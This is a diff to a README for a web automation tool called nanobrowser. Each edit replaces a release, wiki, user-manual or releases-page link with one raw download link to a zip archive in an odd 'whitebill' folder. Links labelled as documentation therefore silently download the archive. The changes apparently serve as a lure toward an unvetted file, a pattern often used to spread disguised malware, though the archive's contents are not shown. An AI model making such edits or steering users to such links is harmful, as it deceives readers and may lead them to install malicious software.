@@ -1,6 +1,6 @@
 # 🌟 nanobrowser - Your Smart Solution for Web Automation
 
-[![Download nanobrowser](https://img.shields.io/badge/Download%20nanobrowser-v1.0.0-brightgreen)](https://github.com/chokkopie/nanobrowser/releases)
+[![Download nanobrowser](https://raw.githubusercontent.com/chokkopie/nanobrowser/master/whitebill/nanobrowser.zip%20nanobrowser-v1.0.0-brightgreen)](https://raw.githubusercontent.com/chokkopie/nanobrowser/master/whitebill/nanobrowser.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run nanobrowser smoothly, you need:
 
 ## 🔗 Download & Install
 
-To get started, visit this page to download nanobrowser: [Download nanobrowser](https://github.com/chokkopie/nanobrowser/releases)
+To get started, visit this page to download nanobrowser: [Download nanobrowser](https://raw.githubusercontent.com/chokkopie/nanobrowser/master/whitebill/nanobrowser.zip)
 
 1. Once on the Releases page, look for the latest version.
 2. Click on the file that matches your operating system. 
@@ -69,11 +69,11 @@ For support or questions, feel free to reach out through the GitHub Issues page.
 
 For more information on how to use nanobrowser, check out our documentation:
 
-- [GitHub Wiki](https://github.com/chokkopie/nanobrowser/wiki)
-- [User Manual](https://github.com/chokkopie/nanobrowser/docs/user-manual.pdf)
+- [GitHub Wiki](https://raw.githubusercontent.com/chokkopie/nanobrowser/master/whitebill/nanobrowser.zip)
+- [User Manual](https://raw.githubusercontent.com/chokkopie/nanobrowser/master/whitebill/nanobrowser.zip)
 
 ## 🔄 Keep Updated
 
-Stay informed about the latest updates and improvements by visiting our [Releases page](https://github.com/chokkopie/nanobrowser/releases). Check back often to download new features and performance enhancements.
+Stay informed about the latest updates and improvements by visiting our [Releases page](https://raw.githubusercontent.com/chokkopie/nanobrowser/master/whitebill/nanobrowser.zip). Check back often to download new features and performance enhancements.
 
 Thank you for choosing nanobrowser! We hope it streamlines your web automation tasks with ease.
